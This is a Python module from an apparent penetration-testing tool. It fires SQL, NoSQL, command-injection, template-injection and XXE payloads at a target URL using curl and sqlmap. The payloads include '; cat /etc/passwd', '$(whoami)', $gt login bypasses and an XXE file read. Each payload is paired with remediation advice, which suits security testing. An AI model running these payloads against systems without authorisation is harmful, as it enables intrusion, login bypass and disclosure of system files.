"""Injection testing tools module."""
import logging
import json
import tempfile
import os
from typing import Dict, Any, List
from models.session import Finding
from tools.base import BaseTool

logger = logging.getLogger(__name__)

class InjectionTools(BaseTool):
    @property
    def tool_name(self) -> str:
        return "injection"

    @property
    def description(self) -> str:
        return "Injection vulnerability testing tools (SQLi, NoSQLi, Command, SSTI, XXE)"

    async def run_injection(self, session_id: str, target: str, injection_type: str = "sqli", **kwargs) -> Dict[str, Any]:
        if injection_type == "sqli":
            return await self._run_sqli(session_id, target, **kwargs)
        elif injection_type == "nosqli":
            return await self._run_nosqli(session_id, target, **kwargs)
        elif injection_type == "command":
            return await self._run_command_injection(session_id, target, **kwargs)
        elif injection_type == "ssti":
            return await self._run_ssti(session_id, target, **kwargs)
        elif injection_type == "xxe":
            return await self._run_xxe(session_id, target, **kwargs)
        else:
            return {"findings": [], "raw": {}, "error": f"Unknown injection_type: {injection_type}"}

    async def _run_sqli(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        findings = []
        raw = {}
        sqli_payloads = [("id", "1%27"), ("id", "1%20OR%201=1--"), ("q", "test%27%20UNION%20SELECT%20null,null--")]
        manual_results = []
        for param, payload in sqli_payloads:
            test_url = f"{target}/users?{param}={payload}"
            cmd = f"curl -s '{test_url}'"
            result = await self._execute(cmd, session_id, timeout=30)
            manual_results.append({"param": param, "payload": payload, "result": result})
            if result.get("returncode") == 0:
                stdout = result.get("stdout", "").lower()
                error_indicators = ["sql", "mysql", "sqlite", "postgres", "oracle", "syntax error", "unexpected"]
                if any(ind in stdout for ind in error_indicators):
                    findings.append(Finding(
                        session_id=session_id, attack_type="sqli", confidence=0.85,
                        endpoint=test_url, parameter=param,
                        evidence=f"SQL error leaked for payload: {payload}",
                        status="confirmed", cvss_score=9.8, severity="critical",
                        remediation="Use parameterized queries / prepared statements",
                    ))
        raw["manual_tests"] = manual_results
        auth_header = kwargs.get("auth_header", "")
        sqlmap_cmd = f"sqlmap -u '{target}/users?id=1' --batch --level=3 --risk=2 --flush-session"
        if auth_header:
            sqlmap_cmd += f" --headers='{auth_header}'"
        sqlmap_result = await self._execute(sqlmap_cmd, session_id, timeout=300)
        raw["sqlmap"] = sqlmap_result
        if sqlmap_result.get("returncode") == 0:
            stdout = sqlmap_result.get("stdout", "").lower()
            if "sqlmap identified" in stdout or "is vulnerable" in stdout:
                findings.append(Finding(
                    session_id=session_id, attack_type="sqli", confidence=0.95,
                    endpoint=f"{target}/users?id=1",
                    evidence="SQLMap confirmed SQL injection vulnerability",
                    status="confirmed", cvss_score=9.8, severity="critical",
                    remediation="Use parameterized queries / prepared statements",
                ))
        post_url = kwargs.get("post_url", f"{target}/login")
        post_data = '{"username":"*","password":"test"}'
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            f.write(post_data)
            post_file = f.name
        try:
            post_cmd = f"sqlmap -u '{post_url}' --data=@{post_file} --headers='Content-Type: application/json' --batch --dbms=mysql"
            post_result = await self._execute(post_cmd, session_id, timeout=300)
            raw["sqlmap_post"] = post_result
            if post_result.get("returncode") == 0:
                if "sqlmap identified" in post_result.get("stdout", "").lower():
                    findings.append(Finding(
                        session_id=session_id, attack_type="sqli_post", confidence=0.95,
                        endpoint=post_url, parameter="username",
                        evidence="SQLMap confirmed SQL injection in POST body",
                        status="confirmed", cvss_score=9.8, severity="critical",
                        remediation="Use parameterized queries / prepared statements",
                    ))
        finally:
            try:
                os.unlink(post_file)
            except OSError:
                pass
        return {"findings": [f.model_dump() for f in findings], "raw": raw}

    async def _run_nosqli(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        findings = []
        raw = {}
        login_url = kwargs.get("login_url", f"{target}/auth/login")
        cmd_gt = f"curl -s -X POST {login_url} -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}'"
        result_gt = await self._execute(cmd_gt, session_id, timeout=30)
        raw["nosql_gt"] = result_gt
        cmd_regex = f"curl -s -X POST {login_url} -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":{{\"$regex\":\".*\"}}}}'"
        result_regex = await self._execute(cmd_regex, session_id, timeout=30)
        raw["nosql_regex"] = result_regex
        for test_name, result in [("$gt", result_gt), ("$regex", result_regex)]:
            if result.get("returncode") == 0:
                code = result.get("stdout", "").strip()
                if code in ["200", "201", "204"] or "token" in code.lower():
                    findings.append(Finding(
                        session_id=session_id, attack_type="nosql_injection", confidence=0.85,
                        endpoint=login_url,
                        evidence=f"NoSQL operator injection ({test_name}) may have bypassed authentication",
                        status="confirmed", cvss_score=9.8, severity="critical",
                        remediation="Sanitize inputs; avoid passing raw objects to NoSQL queries",
                    ))
        return {"findings": [f.model_dump() for f in findings], "raw": raw}

    async def _run_command_injection(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        findings = []
        raw = {}
        test_url = kwargs.get("command_test_url", f"{target}/utils/ping")
        payloads = ["; ls", "| ls", "\x60ls\x60", "; cat /etc/passwd", "$(whoami)"]
        for payload in payloads:
            cmd = f"curl -s -X POST {test_url} -H 'Content-Type: application/json' -d '{{\"host\":\"127.0.0.1{payload}\"}}'"
            result = await self._execute(cmd, session_id, timeout=30)
            raw[payload] = result
            if result.get("returncode") == 0:
                stdout = result.get("stdout", "")
                indicators = ["root:", "bin/", "usr/", "etc/", "home/", "root", "daemon"]
                if any(ind in stdout for ind in indicators):
                    findings.append(Finding(
                        session_id=session_id, attack_type="command_injection", confidence=0.95,
                        endpoint=test_url, parameter="host",
                        evidence=f"Command injection confirmed with payload: {payload}. Output: {stdout[:200]}",
                        status="confirmed", cvss_score=9.8, severity="critical",
                        remediation="Never pass user input to shell commands; use safe APIs",
                    ))
                    break
        if not findings:
            findings.append(Finding(
                session_id=session_id, attack_type="command_injection", confidence=0.8,
                endpoint=test_url,
                evidence="Command injection payloads did not produce command output",
                status="potential", cvss_score=0.0, severity="info",
            ))
        return {"findings": [f.model_dump() for f in findings], "raw": raw}

    async def _run_ssti(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        findings = []
        raw = {}
        test_url = kwargs.get("ssti_test_url", f"{target}/render")
        payloads = [("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"), ("#{7*7}", "49"), ("${{7*7}}", "49")]
        for payload, expected in payloads:
            encoded = payload.replace("{", "%7B").replace("}", "%7D").replace("<", "%3C").replace(">", "%3E").replace("#", "%23").replace("=", "%3D")
            cmd = f"curl -s '{test_url}?template={encoded}'"
            result = await self._execute(cmd, session_id, timeout=30)
            raw[payload] = result
            if result.get("returncode") == 0:
                stdout = result.get("stdout", "")
                if expected in stdout:
                    findings.append(Finding(
                        session_id=session_id, attack_type="ssti", confidence=0.95,
                        endpoint=test_url, parameter="template",
                        evidence=f"SSTI confirmed: payload '{payload}' evaluated to {expected}",
                        status="confirmed", cvss_score=9.8, severity="critical",
                        remediation="Use context-aware auto-escaping template engines",
                    ))
                    break
        if not findings:
            findings.append(Finding(
                session_id=session_id, attack_type="ssti", confidence=0.7,
                endpoint=test_url,
                evidence="SSTI payloads did not evaluate",
                status="potential", cvss_score=0.0, severity="info",
            ))
        return {"findings": [f.model_dump() for f in findings], "raw": raw}

    async def _run_xxe(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        findings = []
        raw = {}
        test_url = kwargs.get("xxe_test_url", f"{target}/import")
        xxe_content = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
            f.write(xxe_content)
            xxe_file = f.name
        try:
            cmd = f'curl -s -X POST {test_url} -H "Content-Type: application/xml" -d @{xxe_file}'
            result = await self._execute(cmd, session_id, timeout=30)
            raw["xxe_test"] = result
            if result.get("returncode") == 0:
                stdout = result.get("stdout", "")
                if "root:" in stdout:
                    findings.append(Finding(
                        session_id=session_id, attack_type="xxe", confidence=0.95,
                        endpoint=test_url,
                        evidence=f"XXE confirmed: /etc/passwd contents retrieved. Output: {stdout[:300]}",
                        status="confirmed", cvss_score=7.5, severity="high",
                        remediation="Disable external entity processing in XML parsers",
                    ))
                else:
                    findings.append(Finding(
                        session_id=session_id, attack_type="xxe", confidence=0.7,
                        endpoint=test_url,
                        evidence="XXE payload sent but no file contents returned",
                        status="potential", cvss_score=0.0, severity="info",
                    ))
        finally:
            try:
                os.unlink(xxe_file)
            except OSError:
                pass
        return {"findings": [f.model_dump() for f in findings], "raw": raw}
